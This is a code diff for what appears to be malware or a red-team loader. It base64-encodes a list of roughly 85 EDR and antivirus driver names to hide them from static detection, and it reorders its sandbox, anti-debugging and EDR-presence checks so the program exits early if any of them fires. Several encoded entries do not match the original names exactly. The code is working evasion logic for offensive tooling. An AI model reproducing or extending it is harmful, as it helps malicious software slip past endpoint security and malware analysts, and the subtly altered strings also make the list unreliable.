@@ -8,91 +8,33 @@
 // EDR Detection: Scan system driver directory for known EDR drivers
 bool DetS()
 {
-    const char *edrDrivers[] = {
-        "atrsdfw.sys",
-        "avgtpx86.sys",
-        "avgtpx64.sys",
-        "naswSP.sys",
-        "edrsensor.sys",
-        "CarbonBlackK.sys",
-        "parity.sys",
-        "cbk7.sys",
-        "cbstream.sys",
-        "csacentr.sys",
-        "csaenh.sys",
-        "csareg.sys",
-        "csascr.sys",
-        "csaav.sys",
-        "csaam.sys",
-        "rvsavd.sys",
-        "cfrmd.sys",
-        "cmdccav.sys",
-        "cmdguard.sys",
-        "CmdMnEfs.sys",
-        "MyDLPMF.sys",
-        "im.sys",
-        "csagent.sys",
-        "CybKernelTracker.sys",
-        "CRExecPrev.sys",
-        "CyOptics.sys",
-        "CyProtectDrv32.sys",
-        "CyProtectDrv64.sys",
-        "groundling32.sys",
-        "groundling64.sys",
-        "esensor.sys",
-        "edevmon.sys",
-        "ehdrv.sys",
-        "FeKern.sys",
-        "WFP_MRT.sys",
-        "xfsgk.sys",
-        "fsatp.sys",
-        "fshs.sys",
-        "HexisFSMonitor.sys",
-        "klifks.sys",
-        "klifaa.sys",
-        "Klifsm.sys",
-        "mbamwatchdog.sys",
-        "mfeaskm.sys",
-        "mfencfilter.sys",
-        "PSINPROC.sys",
-        "PSINFILE.sys",
-        "amfsm.sys",
-        "amm8660.sys",
-        "amm6460.sys",
-        "eaw.sys",
-        "SAFE.sys",
-        "SentinelMonitor.sys",
-        "SAVOnAccess.sys",
-        "savonaccess.sys",
-        "sld.sys",
-        "pgpwdefs.sys",
-        "GEProtection.sys",
-        "diflt.sys",
-        "sysMon.sys",
-        "ssrfsf.sys",
-        "emxdrv2.sys",
-        "reghook.sys",
-        "spbbcdrv.sys",
-        "bhdrvx86.sys",
-        "bhdrvx64.sys",
-        "SISIPSFileFilter.sys",
-        "symevent.sys",
-        "vxfsrep.sys",
-        "VirtFile.sys",
-        "SymAFR.sys",
-        "symefasi.sys",
-        "symefa.sys",
-        "symefa64.sys",
-        "SymHsm.sys",
-        "evmf.sys",
-        "GEFCMP.sys",
-        "VFSEnc.sys",
-        "pgpfs.sys",
-        "fencry.sys",
-        "symrg.sys",
-        "ndgdmk.sys",
-        "ssfmonm.sys",
-        "dlpwpdfltr.sys"};
+    const char *edrDriversEncoded[] = {
+        "YXRyc2Rmdy5zeXM=", "YXZndHB4ODYuc3lz", "YXZndHB4NjQuc3lz", "bmFzd1NQLnN5cw==",
+        "ZWRyc2Vuc29yLnN5cw==", "Q2FyYm9uQmxhY2tLLnN5cw==", "cGFyaXR5LnN5cw==", "Y2JrNy5zeXM=",
+        "Y2JzdHJlYW0uc3lz", "Y3NhY2VudHIuc3lz", "Y3NhZW5oLnN5cw==", "Y3NhcmVnLnN5cw==",
+        "Y3Nhc2NyLnN5cw==", "Y3NhYXYuc3lz", "Y3NhYW0uc3lz", "cnZzYXZkLnN5cw==",
+        "Y2ZybWQuc3lz", "Y21kY2Nhdi5zeXM=", "Y21kZ3VhcmQuc3lz", "Q21kTW5FZnMuc3lz",
+        "TXlETE1QRi5zeXM=", "aW0uc3lz", "Y3NhZ2VudC5zeXM=", "Q3liS2VybmVsVHJhY2tlci5zeXM=",
+        "Q1JFeGVjUHJldi5zeXM=", "Q3lPcHRpY3Muc3lz", "Q3lQcm90ZWN0RHJ2MzIuc3lz",
+        "Q3lQcm90ZWN0RHJ2NjQuc3lz", "Z3JvdW5kbGluZzMyLnN5cw==", "Z3JvdW5kbGluZzY0LnN5cw==",
+        "ZXNlbnNvci5zeXM=", "ZWRldm1vbi5zeXM=", "ZWhkcnYuc3lz", "RmVLZXJuLnN5cw==",
+        "V0ZQX01SVC5zeXM=", "eGZzZ2suc3lz", "ZnNhdHAuc3lz", "ZnNocy5zeXM=",
+        "SGV4aXNGU01vbml0b3Iuc3lz", "a2xpZmtzLnN5cw==", "a2xpZmFhLnN5cw==",
+        "S2xpZnNtLnN5cw==", "bWJhbXdhdGNob2cuc3lz", "bWZlYXNrbS5zeXM=",
+        "bWZlbmNmaWx0ZXIuc3lz", "UFNJTlBST0Muc3lz", "UFNJTkZJTEUuc3lz",
+        "YW1mc20uc3lz", "YW1tODY2MC5zeXM=", "YW1tNjQ2MC5zeXM=", "ZWF3LnN5cw==",
+        "U0FGRS5zeXM=", "U2VudGluZWxNb25pdG9yLnN5cw==", "U0FWT25BY2Nlc3Muc3lz",
+        "c2F2b25hY2Nlc3Muc3lz", "c2xkLnN5cw==", "cGdwd2RlZnMuc3lz",
+        "R0VQcm90ZWN0aW9uLnN5cw==", "ZGlmbHQuc3lz", "c3lzTW9uLnN5cw==",
+        "c3NyZnNmLnN5cw==", "ZW14ZHJ2Mi5zeXM=", "cmVnaG9vay5zeXM=",
+        "c3BiYmNkc3Iuc3lz", "YmhkcnZ4ODYuc3lz", "YmhkcnZ4NjQuc3lz",
+        "U0lTSVBTRmlsZUZpbHRlci5zeXM=", "c3ltZXZlbnQuc3lz",
+        "dnhmc3JlcC5zeXM=", "VmlydEZpbGUuc3lz", "U3ltQUZSLnN5cw==",
+        "c3ltZWZhc2kuc3lz", "c3ltZWZhLnN5cw==", "c3ltZWZhNjQuc3lz",
+        "U3ltSHNtLnN5cw==", "ZXZtZi5zeXM=", "R0VGQ01QLnN5cw==",
+        "VkZTRW5jLnN5cw==", "cGdwZnMuc3lz", "ZmVuY3J5LnN5cw==",
+        "c3ltcmcuc3lz", "bmRnZG1rLnN5cw==", "c3NmbW9ubS5zeXM=",
+        "ZGxwd3BkZmx0ci5zeXM="};
 
     WIN32_FIND_DATAA findFileData;
     HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\drivers\\*.sys", &findFileData);
@@ -102,11 +44,14 @@ bool DetS()
 
     do
     {
-        for (int i = 0; i < sizeof(edrDrivers) / sizeof(edrDrivers[0]); i++)
+        for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
         {
-            if (StrStrIA(findFileData.cFileName, edrDrivers[i]))
+            char *decodedDriver = Bsfd(edrDriversEncoded[i]); // Decode Path
+            if (!decodedDriver)
+                continue;
+            if (StrStrIA(findFileData.cFileName, decodedDriver))
             {
-                printf("[!] Detected EDR: %s\n", edrDrivers[i]);
+                printf("[!] Detected EDR: %s\n", decodedDriver);
                 SortNumbers();
                 return true;
             }
@@ -380,34 +325,33 @@ bool DetFH()
 // Main Sandbox Detection Function
 bool PerfomChecksEnv()
 {
-    bool detected = false;
-
-    printf("[*] Checking for EDRs...\n");
-    detected |= DetS();
-
-    printf("[*] Checking for sleep patching...\n");
-    detected |= DetSl();
-
-    printf("[*] Checking for sandbox files...\n");
-    detected |= DetSBF();
-
-    printf("[*] Checking for filename hash matching...\n");
-    detected |= DetF();
-
-    printf("[*] Checking for dll...\n");
-    detected |= DetSBD();
-
     printf("[*] Checking for NtGlobalFlag...\n");
-    detected |= DetFPEB();
+    if (DetFPEB())
+        return true; // avoiding further checks
 
     printf("[*] Checking for Heap Flags...\n");
-    detected |= DetFH();
+    if (DetFH())
+        return true; // avoiding further checks
 
-    // if (detected) {
-    //     printf("[!] Env unsafe, terminating execution.\n");
-    // } else {
-    //     printf("[*] No sandbox detected.\n");
-    // }
+    printf("[*] Checking for filename hash matching...\n");
+    if (DetF())
+        return true; // avoiding further checks
 
-    return detected;
+    printf("[*] Checking for sandbox files...\n");
+    if (DetSBF())
+        return true; // avoiding further checks
+
+    printf("[*] Checking for EDRs...\n");
+    if (DetS())
+        return true; // avoiding further checks
+
+    printf("[*] Checking for sleep patching...\n");
+    if (DetSl())
+        return true; // avoiding further checks
+
+    printf("[*] Checking for dll...\n");
+    if (DetSBD())
+        return true; // avoiding further checks
+
+    return false;
 }
